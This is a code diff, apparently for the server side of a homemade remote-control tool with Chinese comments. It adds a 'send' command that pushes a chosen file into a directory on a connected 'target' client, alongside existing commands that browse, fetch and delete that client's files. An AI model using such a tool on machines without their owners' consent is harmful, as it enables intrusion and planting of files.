@@ -15,9 +15,9 @@ import threading
 import cv2
 import os
 import numpy as np
-import win32api
-import win32file
 import pickle
+import tkinter
+from tkinter import filedialog
 
 # ============================================================================
 # 第一部分：服务端初始化
@@ -248,8 +248,60 @@ def handle_file(target_client, addr):
             info_data = recv_exact(target_client, info_len)
             file_information = info_data.decode('gbk', errors='ignore')
             print(f"[{addr}] {file_path} 文件信息：\n{file_information}")
+        #发送文件
+        elif cmd=='send':
+            if not path:
+                print("[-] 尚未导航，请先用 to 命令")
+                continue
+            # 第一步：通知客户端准备接收文件（发送目标目录）
+            target_client.send(f"send {path}".encode())
+            # 第二步：等待客户端就绪信号
+            ready_signal = recv_exact(target_client, 5)
+            if ready_signal != b"READY":
+                print(f"[-] 客户端未就绪，收到：{ready_signal}")
+                continue
+            print(f"[{addr}] 客户端已就绪，准备发送文件")
+            # 第三步：打开文件选择对话框
+            root = tkinter.Tk()
+            root.withdraw()
+            file_path = filedialog.askopenfilename(title="选择要发送的文件")
+            if not file_path:
+                print("[!] 未选择文件，已取消")
+                target_client.sendall(b"-0000001")  # 8字节通知客户端取消
+                continue
+            try:
+                # 第四步：发送文件名（让客户端拼接完整保存路径）
+                filename = os.path.basename(file_path)
+                filename_bytes = filename.encode('utf-8')
+                target_client.sendall(f"{len(filename_bytes):08d}".encode() + filename_bytes)
+                ack = recv_exact(target_client, 2)
+                if ack != b"OK":
+                    print(f"[-] 客户端未确认文件名，收到：{ack}")
+                    continue
+                # 第五步：发送文件大小并传输数据
+                file_size = os.path.getsize(file_path)
+                target_client.sendall(f"{file_size:08d}".encode())
+                ack = recv_exact(target_client, 2)
+                if ack != b"OK":
+                    print(f"[-] 客户端未确认，收到：{ack}")
+                    continue
+                # 发送文件数据（分块，不带额外长度头）
+                with open(file_path, 'rb') as f:
+                    while True:
+                        chunk = f.read(4096)
+                        if not chunk:
+                            break
+                        target_client.sendall(chunk)
+                # 接收客户端完成确认
+                result = recv_exact(target_client, 7)
+                if result == b"SUCCESS":
+                    print(f"[{addr}] 文件 {file_path} 已发送到客户端 {path}")
+                else:
+                    print(f"[-] 客户端报告错误：{result.decode(errors='ignore')}")
+            except Exception as e:
+                print(f"[-] 发送文件失败：{e}")
         else:
-            print("[-] 未知命令，支持：to / back / look / get / delete / information /0")
+            print("[-] 未知命令，支持：to / back / look / get / delete / information / send /0")
 
         
 
